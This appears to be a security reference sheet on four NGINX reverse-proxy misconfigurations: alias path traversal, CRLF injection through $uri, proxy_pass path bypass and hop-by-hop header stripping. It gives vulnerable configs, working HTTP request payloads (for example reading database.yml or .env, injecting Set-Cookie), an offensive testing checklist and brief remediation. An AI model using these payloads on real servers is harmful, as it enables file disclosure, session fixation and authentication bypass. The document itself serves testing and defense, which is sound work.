# Mechanism: NGINX & Server-Edge Routing Misconfigurations

## 1. Architectural Vulnerability Profile
*   **Vulnerability Class:** Proxy Routing Ambiguity / Alias Traversal / Header Normalization Flaw
*   **STRIDE Category:** Information Disclosure, Elevation of Privilege, Tampering
*   **Trust Boundary Crossed:** Edge Reverse Proxy (NGINX / HAProxy / Envoy) $\rightarrow$ Upstream Internal Microservice / File System
*   **Target Architectures:** Web servers and load balancers managing static asset routing and upstream reverse proxy passes.

---

## 2. The 4 Classic NGINX Failure Modes

```
┌───────────────────────────────────────────────────────────────────────────────────┐
│                     أنماط أخطاء التكوين الشائعة في NGINX والخوادم الطرفية         │
├─────────────────────────┬─────────────────────────────────────────────────────────┤
│ 1. Alias Off-By-Slash   │ • location /i { alias /var/www/images/; } -> /i../secret│
├─────────────────────────┼─────────────────────────────────────────────────────────┤
│ 2. CRLF via $uri        │ • return 301 https://$host$uri; -> Response Splitting   │
├─────────────────────────┼─────────────────────────────────────────────────────────┤
│ 3. Proxy Pass Desync    │ • location /api/ { proxy_pass http://backend; } دمج مسار│
├─────────────────────────┼─────────────────────────────────────────────────────────┤
│ 4. Hop-By-Hop Stripping │ • تزوير ترويسة Connection لحذف ترويسات الحماية والـ Auth│
└─────────────────────────┴─────────────────────────────────────────────────────────┘
```

### 1. Off-By-Slash Alias Path Traversal
*   **Vulnerable NGINX Block:**
    ```nginx
    location /static {
        alias /var/www/app/static/;
    }
    ```
*   **Flaw:** Notice `/static` lacks a trailing slash, but `alias /var/www/app/static/;` has one.
*   **Exploitation:**
    ```http
    GET /static../config/database.yml HTTP/1.1
    Host: target.com
    ```
    *   NGINX replaces `/static` with `/var/www/app/static/`, resulting in:
    *   `/var/www/app/static/../config/database.yml` $\rightarrow$ resolves to `/var/www/app/config/database.yml`!
    *   **Impact:** Read any arbitrary file from parent directory on the server file system.

### 2. CRLF Injection via Unencoded `$uri`
*   **Vulnerable NGINX Block:**
    ```nginx
    location / {
        return 302 https://$host$uri;
    }
    ```
*   **Flaw:** `$uri` is normalized and decoded by NGINX. If user supplies encoded CRLF (`%0d%0a`), NGINX expands it into literal newlines in the `Location` response header.
*   **Exploitation:**
    ```http
    GET /%0d%0aSet-Cookie:%20session=attacker_controlled;%20Domain=.target.com HTTP/1.1
    Host: target.com
    ```
    *   **Impact:** HTTP Response Splitting, Session Fixation, and XSS.

### 3. Missing Trailing Slash in `proxy_pass` (Path Normalization Gap)
*   **Case A (Trailing slash present on both):**
    `location /api/ { proxy_pass http://backend:8080/; }` $\rightarrow$ `/api/users` becomes `/users` on backend.
*   **Case B (Missing slash on proxy_pass):**
    `location /api/ { proxy_pass http://backend:8080; }` $\rightarrow$ `/api/users` stays `/api/users`.
*   **Offensive Pivot:** Injecting semicolons or matrix parameters (`/api;admin/users` or `/api/..;/admin`) allows bypassing NGINX `location /admin` blocks while reaching internal backend admin routes.

### 4. Hop-by-Hop Header Stripping (Bypassing Internal Auth)
*   **Mechanism:** Reverse proxies trust hop-by-hop headers defined in the `Connection` header (RFC 7230).
*   **Exploitation:**
    ```http
    GET /api/admin/metrics HTTP/1.1
    Host: target.com
    Connection: close, X-Forwarded-For, X-Custom-Auth-Check
    ```
    *   NGINX deletes `X-Custom-Auth-Check` before forwarding to the backend, causing downstream microservices with default-fallback logic to treat the request as internal!

---

## 3. Offensive Testing Checklist

- [ ] Look for static asset directories (`/static`, `/images`, `/assets`, `/media`, `/docs`).
- [ ] Test alias traversal: `GET /static../`, `GET /images../.env`, `GET /assets../package.json`.
- [ ] Test CRLF on redirects: `GET /%0d%0aX-Injected-Header:%20pwned`.
- [ ] Test matrix parameter bypass: `GET /api;test/v1/users` and `GET /api/..;/admin`.
- [ ] Test Hop-by-hop stripping: `Connection: X-Forwarded-Host, X-Real-IP`.

---

## 4. Remediation & Defense
1. **Always Match Trailing Slashes:** If `location /static/` has a slash, ensure `alias /path/;` also has a slash.
2. **Use `$request_uri` in Redirects:** Never use `$uri` for redirects; use `$request_uri` which retains raw encoding.
3. **Canonicalize Paths Before Proxying:** Enforce strict upstream path resolution rules.
